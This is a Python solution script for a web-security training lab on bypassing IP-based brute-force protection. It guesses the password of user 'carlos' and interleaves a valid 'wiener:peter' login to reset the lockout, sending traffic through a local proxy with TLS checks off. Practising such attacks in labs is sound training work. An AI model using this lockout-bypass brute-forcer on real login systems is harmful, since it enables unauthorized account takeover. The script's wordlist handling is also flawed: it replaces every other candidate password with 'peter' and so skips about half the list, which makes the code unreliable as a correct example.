## Lab: Broken brute-force protection, IP block
import requests

import urllib3

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080',
           "https": "http://127.0.0.1:8080"
           }


def login(client, url, username, password):
    data = {
        'username': username,
        'password': password
    }

    req = client.post(url, data=data, verify=False, proxies=proxies, allow_redirects=False)
    if username == 'carlos' and req.status_code == 302:
        return 302


def enumerate_password(client, url):
    passwords = open("passwords.txt", 'r').read().split("\n")
    pass_payload = []

    # Create password list
    for password in passwords:
        if passwords.index(password) % 2 == 0:
            pass_payload.insert(passwords.index(password), password)
        else:
            pass_payload.insert(passwords.index(password) + 1, "peter")

    for key in pass_payload:
        if pass_payload.index(key) % 2 == 0:
            username = "carlos"
        else:
            username = "wiener"

        if login(client, url, username, key) == 302:
            return key


if __name__ == '__main__':
    client = requests.session()
    url = '{host}/login'
    print("Brute-forcing Correct Credentials")
    print("[+] Enumerate carlos's password...")
    password = enumerate_password(client, url)
    print(f"[+] Carlos's password: {password}")
